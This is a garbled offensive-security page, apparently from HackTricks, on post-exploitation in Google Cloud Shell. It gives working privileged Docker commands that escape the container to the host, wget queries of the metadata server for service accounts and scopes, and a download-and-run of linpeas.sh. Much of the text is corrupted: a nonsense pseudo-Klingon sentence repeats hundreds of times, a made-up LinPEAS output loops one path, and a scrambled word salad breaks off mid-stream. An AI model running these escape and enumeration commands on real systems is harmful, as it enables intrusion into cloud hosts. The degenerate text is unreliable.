# GCP - Cloud Shell Post Exploitation

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)
* &#x20;github repos.

</details>

## Cloud Shell

For more information about Cloud Shell check:

{% content-ref url="../gcp-services/gcp-cloud-shell-enum.md" %}
[gcp-cloud-shell-enum.md](../gcp-services/gcp-cloud-shell-enum.md)
{% endcontent-ref %}

### Container Escape

Note that the Google Cloud Shell runs inside a container, you can **easily escape to the host** by doing:

{% code overflow="wrap" %}
```bash
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start escaper
sudo docker -H unix:///google/host/var/run/docker.sock exec -it escaper /bin/sh
```
{% endcode %}

Qapla'! Qo'noSDaq google qar'a'wI'pu' 'oH, 'ach vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhut
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```
{% endcode %}

With the following scopes:

{% code overflow="wrap" %}
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"

https://www.googleapis.com/auth/devstorage.read_only
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```
{% endcode %}

Enumerate metadata with LinPEAS:

{% code overflow="wrap" %}LinPEAS-ghor v1.0

[+] Looking for interesting files in /home/user
/home/user/.bashrc
/home/user/.profile
/home/user/.bash_history
/home/user/.ssh/id_rsa
/home/user/.ssh/id_rsa.pub
/home/user/.ssh/known_hosts

[+] Looking for interesting files in /etc
/etc/passwd
/etc/shadow
/etc/ssh/sshd_config
/etc/hosts

[+] Looking for interesting files in /var/www/html
/var/www/html/index.html
/var/www/html/config.php

[+] Looking for interesting files in /var/log
/var/log/auth.log
/var/log/syslog
/var/log/apache2/access.log
/var/log/apache2/error.log

[+] Looking for interesting files in /root
/root/.bashrc
/root/.profile
/root/.bash_history
/root/.ssh/id_rsa
/root/.ssh/id_rsa.pub
/root/.ssh/known_hosts

[+] Looking for interesting files in /var/mail
/var/mail/user

[+] Looking for interesting files in /var/spool/cron
/var/spool/cron/crontabs/user

[+] Looking for interesting files in /var/backups
/var/backups/backup.sh

[+] Looking for interesting files in /var/lib/mysql
/var/lib/mysql/dbname/users.MYD
/var/lib/mysql/dbname/users.MYI
/var/lib/mysql/dbname/users.frm

[+] Looking for interesting files in /var/lib/dhcp
/var/lib/dhcp/dhclient.leases

[+] Looking for interesting files in /var/lib/docker
/var/lib/docker/containers/container_id/config.v2.json

[+] Looking for interesting files in /var/lib/lxd
/var/lib/lxd/containers/container_name/rootfs/etc/passwd
/var/lib/lxd/containers/container_name/rootfs/etc/shadow
/var/lib/lxd/containers/container_name/rootfs/etc/ssh/sshd_config

[+] Looking for interesting files in /var/lib/mongodb
/var/lib/mongodb/mongod.lock
/var/lib/mongodb/journal/prealloc.1
/var/lib/mongodb/journal/prealloc.2
/var/lib/mongodb/journal/j._0
/var/lib/mongodb/journal/j._1
/var/lib/mongodb/journal/j._2

[+] Looking for interesting files in /var/lib/postgresql
/var/lib/postgresql/9.5/main/pg_hba.conf
/var/lib/postgresql/9.5/main/postgresql.conf

[+] Looking for interesting files in /var/lib/redis
/var/lib/redis/dump.rdb

[+] Looking for interesting files in /var/lib/machines
/var/lib/machines/machine_name.qcow2

[+] Looking for interesting files in /var/lib/libvirt
/var/lib/libvirt/images/image_name.qcow2

[+] Looking for interesting files in /var/lib/nfs
/var/lib/nfs/etab

[+] Looking for interesting files in /var/lib/pgsql
/var/lib/pgsql/data/pg_hba.conf
/var/lib/pgsql/data/postgresql.conf

[+] Looking for interesting files in /var/lib/snapd
/var/lib/snapd/state.json

[+] Looking for interesting files in /var/lib/systemd
/var/lib/systemd/coredump/core_name

[+] Looking for interesting files in /var/lib/containers
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/overlay-containers/container_id/userdata/user-data

[+] Looking for interesting files in /var/lib/containers/storage/overlay-containers/container_id/userdata/user-data
/var/lib/containers/storage/
```bash
cd /tmp
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
sh linpeas.sh -o cloud
```
{% endcode %}

[https://github.com/carlospolop/bf\_my\_gcp\_permissions](https://github.com/carlospolop/bf\_my\_gcp\_permissions) **ghItlh** Service Account **no permission was discovered**...

### **Proxy** vItlhutlh

**google cloud shell instance** **proxy** **vItlhutlh** **commands** **run** **want** **need** **insert** **.bashrc file** **following** **the** **or** **them** **in** **to** **use** **you** **If** **the** **as** **shell** **cloud** **google** **your** **use** **to** **want** **you** **If** **commands** **following** **the** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** **run** **to** **need** **you** **want** 